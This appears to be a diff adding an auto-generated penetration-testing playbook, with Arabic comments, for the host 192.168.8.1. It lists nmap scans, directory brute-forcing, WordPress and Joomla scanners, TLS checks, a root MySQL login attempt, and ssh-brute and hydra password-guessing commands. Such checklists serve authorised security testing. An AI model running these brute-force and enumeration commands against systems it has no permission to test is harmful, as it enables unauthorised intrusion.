@@ -1,0 +1,89 @@
+# Playbook for 192.168.8.1
+
+## شل آمن (SSH) (port 22)
+
+### فحص الإصدار
+
+# فحص إصدار خدمة SSH
+nmap -sV -p22 192.168.8.1
+
+# إصدار SSH المحلي للمقارنة
+ssh -V
+
+### تعداد المستخدمين
+
+# فحص طرق المصادقة المتاحة
+nmap -p22 --script ssh-auth-methods 192.168.8.1
+
+# محاولة تخمين كلمات مرور بأمان
+nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.8.1
+
+### فحص الثغرات
+
+# بحث في قاعدة exploits
+searchsploit openssh 8.2
+
+# تعداد الخوارزميات المدعومة (قد تكشف ضعف)
+nmap -p22 --script ssh2-enum-algos 192.168.8.1
+
+## خادم ويب (HTTP) (port 80)
+
+### استطلاع أساسي
+
+# قراءة headers فقط (سريع)
+curl -I http://192.168.8.1
+
+# بصمة شاملة للتقنيات
+whatweb http://192.168.8.1
+
+# فحص آلي لثغرات الويب الشائعة
+nikto -h http://192.168.8.1
+
+### تخمين المسارات
+
+# تعداد مسارات بـ 4600 كلمة
+gobuster dir -u http://192.168.8.1 -w /usr/share/wordlists/dirb/common.txt
+
+# أسرع وأعمق - 30 ألف كلمة
+feroxbuster -u http://192.168.8.1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+### فحص CMS
+
+# فحص WordPress للثغرات والمستخدمين
+wpscan --url http://192.168.8.1 --enumerate vp,vt,u
+
+# فحص Joomla
+joomscan -u http://192.168.8.1
+
+### فحص SSL/TLS
+
+# فحص سريع لتشفير SSL
+sslscan 192.168.8.1:443
+
+# فحص شامل (يستغرق دقائق)
+testssl.sh 192.168.8.1
+
+### فحص الثغرات الآلي
+
+# فحص NSE لثغرات ويب معروفة
+nmap -p80,443 --script http-vuln* 192.168.8.1
+
+## قاعدة بيانات MySQL (port 3306)
+
+### الاتصال
+
+# محاولة اتصال كـ root
+mysql -h 192.168.8.1 -u root -p
+
+### تخمين كلمات المرور
+
+# هجوم قاموس على MySQL
+hydra -L users.txt -P pass.txt mysql://192.168.8.1
+
+### استطلاع
+
+# فحص آلي للـ MySQL
+nmap -p3306 --script mysql-enum,mysql-info,mysql-users 192.168.8.1
+
+# فحص كلمات مرور فارغة
+nmap -p3306 --script mysql-empty-password 192.168.8.1
